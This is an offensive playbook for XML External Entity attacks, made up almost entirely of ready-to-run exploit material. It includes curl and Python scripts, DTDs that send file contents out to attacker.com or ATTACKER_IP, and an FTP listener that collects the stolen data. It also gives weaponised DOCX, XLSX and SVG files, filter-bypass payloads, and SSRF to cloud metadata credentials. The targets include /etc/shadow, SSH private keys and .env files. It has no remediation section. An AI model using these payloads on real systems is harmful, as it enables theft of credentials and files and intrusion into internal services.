# XXE (XML External Entity) Playbook

## Indicators

Signs this vulnerability may be present:
- Application accepts XML input (POST body, file upload, API endpoints)
- SOAP web services or WSDL endpoints present
- Content-Type headers include `application/xml`, `text/xml`, or `application/soap+xml`
- File upload functionality accepting SVG, DOCX, XLSX, PPTX, or other XML-based formats
- Application parses RSS/Atom feeds or imports XML configuration
- Error messages reveal XML parser information or file paths
- API endpoints that accept both JSON and XML (Content-Type switching)
- SAML authentication implementation present

## Tools

### Manual Testing with curl

```bash
# Basic XXE test - read /etc/passwd
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'

# Windows file read
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root><data>&xxe;</data></root>'

# XXE via SYSTEM with file:// protocol
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<userInfo><name>&xxe;</name></userInfo>'

# SSRF via XXE
curl -X POST http://target.com/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<root>&xxe;</root>'

# Content-Type switching (JSON endpoint accepting XML)
curl -X POST http://target.com/api/user \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>'

# XXE in SOAP request
curl -X POST http://target.com/soap \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: urn:example" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>'
```

### Python XXE Testing

```python
#!/usr/bin/env python3
import requests

target = "http://target.com/api/xml"

# Basic XXE payload
def test_xxe_basic():
    payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'''

    headers = {"Content-Type": "application/xml"}
    response = requests.post(target, data=payload, headers=headers)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text[:500]}")
    if "root:" in response.text:
        print("[+] XXE vulnerability confirmed!")
    return response

# Blind XXE with external DTD
def test_blind_xxe(attacker_server):
    payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{attacker_server}/xxe.dtd">
  %xxe;
]>
<root>test</root>'''

    headers = {"Content-Type": "application/xml"}
    response = requests.post(target, data=payload, headers=headers)
    return response

# Parameter entity for OOB exfiltration
def generate_dtd(attacker_server):
    """Host this DTD on your server"""
    return f'''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{attacker_server}/?data=%file;'>">
%eval;
%exfil;'''

# Test various file paths
def test_file_paths():
    files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/home/user/.ssh/id_rsa",
        "/var/www/html/config.php",
        "/etc/nginx/nginx.conf",
        "/etc/apache2/apache2.conf",
    ]

    for filepath in files:
        payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{filepath}">
]>
<root>&xxe;</root>'''

        headers = {"Content-Type": "application/xml"}
        try:
            response = requests.post(target, data=payload, headers=headers, timeout=10)
            if response.status_code == 200 and len(response.text) > 50:
                print(f"[+] {filepath}: {len(response.text)} bytes")
        except Exception as e:
            print(f"[-] {filepath}: {e}")

if __name__ == "__main__":
    test_xxe_basic()
```

### Blind XXE Server Setup

```bash
# Create malicious DTD file
cat << 'EOF' > xxe.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:8080/?data=%file;'>">
%eval;
%exfil;
EOF

# Start HTTP server to receive exfiltrated data
python3 -m http.server 8080

# Alternative: Use PHP for logging
cat << 'EOF' > log.php
<?php
file_put_contents("xxe_log.txt", $_SERVER['REQUEST_URI'] . "\n", FILE_APPEND);
?>
EOF
php -S 0.0.0.0:8080

# FTP server for exfiltration (useful for multi-line files)
# Requires python ftplib or ftpd
python3 << 'FTPEOF'
import socket
import threading

def handle_client(conn, addr):
    print(f"Connection from {addr}")
    conn.send(b"220 FTP server ready\r\n")
    while True:
        data = conn.recv(1024)
        if not data:
            break
        print(f"Received: {data.decode('utf-8', errors='ignore')}")
        if data.startswith(b"USER"):
            conn.send(b"331 Password required\r\n")
        elif data.startswith(b"PASS"):
            conn.send(b"230 Login successful\r\n")
        elif data.startswith(b"RETR"):
            conn.send(b"550 File not found\r\n")
        else:
            conn.send(b"200 OK\r\n")
    conn.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 21))
server.listen(5)
print("FTP server listening on port 21")
while True:
    conn, addr = server.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
FTPEOF
```

## Techniques

### 1. Basic XXE (File Read)

Directly read files when XML response is returned to the user.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

Linux file read targets:
```xml
<!-- System files -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/shadow">
<!ENTITY xxe SYSTEM "file:///etc/hosts">
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///etc/issue">

<!-- Process information -->
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
<!ENTITY xxe SYSTEM "file:///proc/version">
<!ENTITY xxe SYSTEM "file:///proc/net/tcp">

<!-- Application files -->
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/.env">
<!ENTITY xxe SYSTEM "file:///opt/app/config/database.yml">

<!-- SSH keys -->
<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">
<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
```

Windows file read targets:
```xml
<!-- System files -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
<!ENTITY xxe SYSTEM "file:///C:/boot.ini">

<!-- IIS configuration -->
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/inetsrv/config/applicationHost.config">

<!-- Application files -->
<!ENTITY xxe SYSTEM "file:///C:/Users/Administrator/Desktop/flag.txt">
```

### 2. Blind XXE (Out-of-Band Exfiltration)

When XML response is not returned, exfiltrate data via external requests.

**Step 1: Host malicious DTD on attacker server**
```xml
<!-- xxe.dtd - host on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:8080/?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Send payload referencing external DTD**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com:8080/xxe.dtd">
  %xxe;
]>
<root>test</root>
```

**Alternative: FTP-based exfiltration for multi-line files**
```xml
<!-- xxe-ftp.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:21/%file;'>">
%eval;
%exfil;
```

**Error-based exfiltration (when errors are displayed)**
```xml
<!-- error-xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 3. XXE to SSRF

Use XXE to make requests to internal services.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

```xml
<!-- AWS metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Internal service scanning -->
<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
<!ENTITY xxe SYSTEM "http://10.0.0.1:22">
<!ENTITY xxe SYSTEM "http://internal-api.local/api/users">

<!-- Gopher protocol for more complex requests (if supported) -->
<!ENTITY xxe SYSTEM "gopher://internal-server:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a">

<!-- Dict protocol -->
<!ENTITY xxe SYSTEM "dict://localhost:11211/stats">
```

### 4. XXE in Different Contexts

#### SOAP Services
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header/>
  <soap:Body>
    <example:Request xmlns:example="http://example.com">
      <data>&xxe;</data>
    </example:Request>
  </soap:Body>
</soap:Envelope>
```

#### SVG Files
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```bash
# Upload SVG with XXE
curl -X POST http://target.com/upload \
  -F "file=@xxe.svg;type=image/svg+xml"
```

#### Office Documents (DOCX, XLSX, PPTX)

These are ZIP archives containing XML files:

```bash
# Create malicious DOCX
mkdir -p word
cat << 'EOF' > word/document.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
EOF

# Create minimal DOCX structure
cat << 'EOF' > '[Content_Types].xml'
<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
</Types>
EOF

mkdir -p _rels
cat << 'EOF' > _rels/.rels
<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
EOF

# Package as DOCX
zip -r malicious.docx '[Content_Types].xml' _rels word
```

#### XLSX (Excel)
```bash
# Create malicious XLSX
mkdir -p xl/worksheets
cat << 'EOF' > xl/worksheets/sheet1.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<worksheet>&xxe;</worksheet>
EOF
# ... create other required files and zip
zip -r malicious.xlsx '[Content_Types].xml' _rels xl
```

#### XML-RPC
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<methodCall>
  <methodName>example.method</methodName>
  <params>
    <param><value>&xxe;</value></param>
  </params>
</methodCall>
```

#### RSS/Atom Feeds
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<rss version="2.0">
  <channel>
    <title>&xxe;</title>
    <link>http://example.com</link>
    <description>Test</description>
  </channel>
</rss>
```

### 5. XXE in JSON Endpoints

Many parsers accept XML when Content-Type is changed.

```bash
# Original JSON request
curl -X POST http://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"user": "test"}'

# Try with XML Content-Type
curl -X POST http://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><user>&xxe;</user></root>'

# Other Content-Types to try
Content-Type: text/xml
Content-Type: application/x-xml
Content-Type: text/html; charset=utf-8
```

## Bypass Techniques

### Entity Encoding Bypass

```xml
<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-
  +ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-

<!-- UTF-16 encoding -->
<?xml version="1.0" encoding="UTF-16"?>
<!-- Continue with regular payload -->
```

### Parameter Entity Bypass

When regular entities are blocked:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % end "]]>">
  <!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">
  %dtd;
]>
<root>&all;</root>
```

```xml
<!-- combine.dtd on attacker server -->
<!ENTITY all "%start;%file;%end;">
```

### External DTD Bypass

When internal DTD entities are blocked:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/xxe.dtd">
<root>&xxe;</root>
```

### Protocol Handler Bypass

```xml
<!-- Different protocols -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://whoami">
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/payload">
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">

<!-- URL encoding -->
<!ENTITY xxe SYSTEM "file://%65%74%63/%70%61%73%73%77%64">
```

### CDATA Wrapper for Binary/Special Characters

```xml
<!-- External DTD (cdata.dtd) -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
%wrapper;
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/cdata.dtd">
  %dtd;
]>
<root>&all;</root>
```

### XInclude Attack

When you cannot modify DOCTYPE but can control XML content:
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

```xml
<!-- XInclude with fallback -->
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/shadow" parse="text">
    <xi:fallback>
      <xi:include href="file:///etc/passwd" parse="text"/>
    </xi:fallback>
  </xi:include>
</root>
```

### Local DTD Exploitation

Use existing DTD files on the target system:
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<root/>
```

Common local DTD paths:
```bash
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/sgml/docbook/xml-dtd-4.1.2/docbookx.dtd
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
```

## Payload Collection

### File Read Payloads

```xml
<!-- Linux -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>

<!-- Windows -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]><a>&x;</a>

<!-- PHP source code -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><a>&x;</a>
```

### SSRF Payloads

```xml
<!-- Cloud metadata -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><a>&x;</a>

<!-- Internal port scan -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "http://localhost:PORT/">]><a>&x;</a>
```

### Blind XXE Payloads

```xml
<!-- OOB via HTTP -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % x SYSTEM "http://attacker.com/xxe.dtd">%x;]><a/>

<!-- OOB via DNS -->
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x SYSTEM "http://xxe.BURP_COLLABORATOR.net/">]><a>&x;</a>
```

## Success Indicators

- File contents returned in XML response (e.g., `/etc/passwd` contents visible)
- HTTP requests received at attacker-controlled server (blind XXE confirmed)
- DNS lookups observed at attacker-controlled domain
- Error messages containing file contents or file paths
- SSRF successful - internal service responses returned
- Time-based differences indicating file existence
- Application behavior changes based on parsed XML content
- Cloud metadata (AWS keys, tokens) retrieved via SSRF chain
- Successful RCE through XXE to SSRF pipeline (Gopher, Redis, etc.)
